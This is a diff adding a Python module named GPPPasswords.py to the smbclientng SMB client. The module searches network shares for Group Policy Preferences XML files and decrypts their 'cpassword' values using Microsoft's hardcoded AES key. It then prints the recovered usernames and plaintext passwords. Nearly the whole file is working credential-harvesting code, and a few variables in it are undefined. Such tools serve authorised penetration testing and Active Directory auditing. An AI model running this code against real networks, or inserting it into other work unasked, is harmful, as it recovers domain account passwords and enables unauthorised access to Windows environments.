@@ -1,0 +1,226 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# File name          : GPPPasswords.py
+# Author             : Podalirius (@podalirius_)
+# Date created       : 02 june 2024
+
+
+import base64
+import charset_normalizer
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import unpad
+import impacket
+import io
+import ntpath
+import re
+from smbclientng.core.Module import Module
+from smbclientng.core.ModuleArgumentParser import ModuleArgumentParser
+from smbclientng.core.utils import windows_ls_entry
+import xml
+from xml.dom import minidom
+
+
+class GPPPasswords(Module):
+    """
+    
+    """
+
+    name = "gpppasswords"
+    description = "Searches for Group Policy Preferences Passwords in a share."
+
+    def parseArgs(self, arguments):
+        """
+        Parses the command line arguments provided to the module.
+
+        This method initializes the argument parser with the module's name and description, and defines all the necessary arguments that the module accepts. It then parses the provided command line arguments based on these definitions.
+
+        Args:
+            arguments (str): A string of command line arguments.
+
+        Returns:
+            ModuleArgumentParser.Namespace | None: The parsed arguments as a Namespace object if successful, None if there are no arguments or help is requested.
+        """
+
+        parser = ModuleArgumentParser(prog=self.name, description=self.description)
+
+        # Adding positional arguments
+        parser.add_argument("paths", metavar="PATH", type=str, nargs="*", default=[], help="The starting point(s) for the search.")
+
+        # Adding actions
+        parser.add_argument("-ls", action="store_true", default=False, help="List current file in ls -dils format on standard output.")
+        parser.add_argument("-download", action="store_true", default=False, help="List current file in ls -dils format on standard output.")
+
+        # Other options
+        parser.add_argument("-maxdepth", type=int, help="Descend at most levels (a non-negative integer) levels of directories below the command line arguments.")
+        parser.add_argument("-mindepth", type=int, help="Do not apply any tests or actions at levels less than levels (a non-negative integer).")
+
+        if len(arguments.strip()) == 0:
+            parser.print_help()
+            return None
+        else:
+            self.options = self.processArguments(parser, arguments)
+
+        return self.options
+
+    def parse_xmlfile_content(self, pathtofile):
+        results = []
+        fh = io.BytesIO()
+        try:
+            # opening the files in streams instead of mounting shares allows for running the script from
+            # unprivileged containers
+            self.smbSession.smbClient.getFile(self.smbSession.smb_share, pathtofile, fh.write)
+        except impacket.smbconnection.SessionError as e:
+            return results
+        except Exception as e:
+            raise
+        rawdata = fh.getvalue()
+        fh.close()
+        gppp_found = False
+        encoding = charset_normalizer.detect(rawdata)["encoding"]
+        if encoding is not None:
+            filecontent = rawdata.decode(encoding).rstrip()
+            if "cpassword" in filecontent:
+                gppp_found = True
+            else:
+                if self.config.debug:
+                    print("[debug] No cpassword was found in %s" % filename)
+    
+        if gppp_found:
+            try:
+                root = minidom.parseString(filecontent)
+                xmltype = root.childNodes[0].tagName
+                # function to get attribute if it exists, returns "" if empty
+                read_or_empty = lambda element, attribute: (element.getAttribute(attribute) if element.getAttribute(attribute) is not None else "")
+
+                # ScheduledTasks
+                if xmltype == "ScheduledTasks":
+                    for topnode in root.childNodes:
+                        task_nodes = [c for c in topnode.childNodes if isinstance(c, xml.dom.minidom.Element)]
+                        for task in task_nodes:
+                            for property in task.getElementsByTagName("Properties"):
+                                results.append({
+                                    "tagName": xmltype,
+                                    "attributes": {
+                                        "username": read_or_empty(task, "name"),
+                                        "runAs": read_or_empty(property, "runAs"),
+                                        "cpassword": read_or_empty(property, "cpassword"),
+                                        "password": self.decrypt_password(read_or_empty(property, "cpassword")),
+                                        "changed": read_or_empty(property.parentNode, "changed"),
+                                    },
+                                    "file": pathtofile
+                                })
+                elif xmltype == "Groups":
+                    for topnode in root.childNodes:
+                        task_nodes = [c for c in topnode.childNodes if isinstance(c, xml.dom.minidom.Element)]
+                        for task in task_nodes:
+                            for property in task.getElementsByTagName("Properties"):
+                                results.append({
+                                    "tagName": xmltype,
+                                    "attributes": {
+                                        "username": read_or_empty(property, "newName"),
+                                        # "userName": read_or_empty(property, "userName"),
+                                        "cpassword": read_or_empty(property, "cpassword"),
+                                        "password": self.decrypt_password(read_or_empty(property, "cpassword")),
+                                        "changed": read_or_empty(property.parentNode, "changed"),
+                                    },
+                                    "file": pathtofile
+                                })
+                else:
+                    for topnode in root.childNodes:
+                        task_nodes = [c for c in topnode.childNodes if isinstance(c, xml.dom.minidom.Element)]
+                        for task in task_nodes:
+                            for property in task.getElementsByTagName("Properties"):
+                                results.append({
+                                    "tagName": xmltype,
+                                    "attributes": {
+                                        "username": read_or_empty(property, "newName"),
+                                        # "userName": read_or_empty(property, "userName"),
+                                        "cpassword": read_or_empty(property, "cpassword"),
+                                        "password": self.decrypt_password(read_or_empty(property, "cpassword")),
+                                        "changed": read_or_empty(property.parentNode, "changed"),
+                                    },
+                                    "file": pathtofile
+                                })
+
+            except Exception as e:
+                raise
+
+        return results
+
+    def decrypt_password(self, pw_enc_b64):
+        if len(pw_enc_b64) != 0:
+            # Thank you Microsoft for publishing the key :)
+            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
+            key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
+            # Thank you Microsoft for using a fixed IV :)
+            iv = b"\x00" * 16
+            pad = len(pw_enc_b64) % 4
+            if pad == 1:
+                pw_enc_b64 = pw_enc_b64[:-1]
+            elif pad == 2 or pad == 3:
+                pw_enc_b64 += "=" * (4 - pad)
+            pw_enc = base64.b64decode(pw_enc_b64)
+            ctx = AES.new(key, AES.MODE_CBC, iv)
+            pw_dec = unpad(ctx.decrypt(pw_enc), ctx.block_size)
+            return pw_dec.decode("utf-16-le")
+        else:
+            # cpassword is empty, cannot decrypt anything.
+            return ""
+
+    def __find_callback(self, entry, fullpath):
+        # Match and print results
+        do_print_results = True
+        if self.options.mindepth is not None:
+            if depth < self.options.mindepth:
+                do_print_results = False
+        if self.options.maxdepth is not None:
+            if depth > self.options.maxdepth:
+                do_print_results = False
+        
+        if do_print_results:
+            if (not entry.is_directory()) and (entry.get_longname().lower().endswith('.xml')):
+                data = self.parse_xmlfile_content(fullpath)
+                if data is not None:
+                    print("[+] %s" % fullpath)
+                    for entry in data:
+                        print("  | username: %s" % entry["attributes"]["username"])
+                        print("  | password: %s" % entry["attributes"]["password"])  
+                        if len(data) > 1:
+                            print("|")
+        return None
+
+    def run(self, arguments):
+        """
+        This function recursively searches for files in a directory hierarchy and prints the results based on specified criteria.
+
+        Args:
+            base_dir (str): The base directory to start the search from.
+            paths (list): List of paths to search within the base directory.
+            depth (int): The current depth level in the directory hierarchy.
+
+        Returns:
+            None
+        """
+
+        self.options = self.parseArgs(arguments=arguments)
+
+        if self.options is not None:
+            # Entrypoint
+            try:
+                next_directories_to_explore = []
+                for path in list(set(self.options.paths)):
+                    next_directories_to_explore.append(ntpath.normpath(path) + ntpath.sep)
+                next_directories_to_explore = sorted(list(set(next_directories_to_explore)))
+                
+                self.smbSession.find(
+                    paths=next_directories_to_explore,
+                    callback=self.__find_callback
+                )
+
+            except (BrokenPipeError, KeyboardInterrupt) as e:
+                print("[!] Interrupted.")
+                self.smbSession.close_smb_session()
+                self.smbSession.init_smb_session()
+
+
+
